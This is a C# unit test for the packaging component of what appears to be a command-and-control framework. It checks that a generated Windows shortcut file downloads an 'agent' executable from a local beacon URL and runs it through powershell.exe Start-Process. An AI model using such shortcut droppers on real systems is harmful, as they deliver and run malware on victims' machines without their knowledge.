using System.Text;
using LibraNextgen.Service.Services.Packaging;
using Xunit;

namespace LibraNextgen.Tests;

/// <summary>
/// 打包器结构测试：LNK 格式的魔数与布局不变量（ISO/FAT16/VHD 打包器已随
/// 下载模态框精简移除，见 BuilderPackageService）。
/// </summary>
public class BuilderPackagingTests
{
    private static byte[] SamplePayload()
    {
        // 模拟 2.6MB agent 载荷（与真实构建产物量级一致）
        var bytes = new byte[2_600_000];
        "MZ"u8.CopyTo(bytes.AsSpan(0, 2));
        return bytes;
    }

    [Fact]
    public void Lnk_Structure_Valid()
    {
        var lnk = LnkWriter.CreateDownloadAndRun("http://127.0.0.1:5270/api/beacon/artifact/45baf269");

        // Header：大小 0x4C + CLSID
        Assert.Equal(0x4Cu, BitConverter.ToUInt32(lnk, 0));
        Assert.Equal("00021401-0000-0000-C000-000000000046",
            new Guid(lnk.AsSpan(4, 16)).ToString("D").ToUpperInvariant());

        // LinkFlags：HasLinkTargetIDList|HasLinkInfo|HasRelativePath|HasWorkingDir|HasArguments|HasIconLocation|IsUnicode
        var flags = BitConverter.ToUInt32(lnk, 20);
        Assert.True((flags & 0x01) != 0);   // HasLinkTargetIDList（模板自带）
        Assert.True((flags & 0x02) != 0);   // HasLinkInfo
        Assert.True((flags & 0x80) != 0);   // IsUnicode

        // 模板前缀（IDList + LinkInfo）应完整
        Assert.Equal(706, LnkWriter.TemplatePrefixLength);

        // 参数里应包含下载 URL 与 Start-Process（StringData 中为 UTF-16）
        var text = Encoding.Unicode.GetString(lnk);
        Assert.Contains("api/beacon/artifact/45baf269", text);
        Assert.Contains("Start-Process", text);
        Assert.Contains("powershell.exe", text);
    }
}
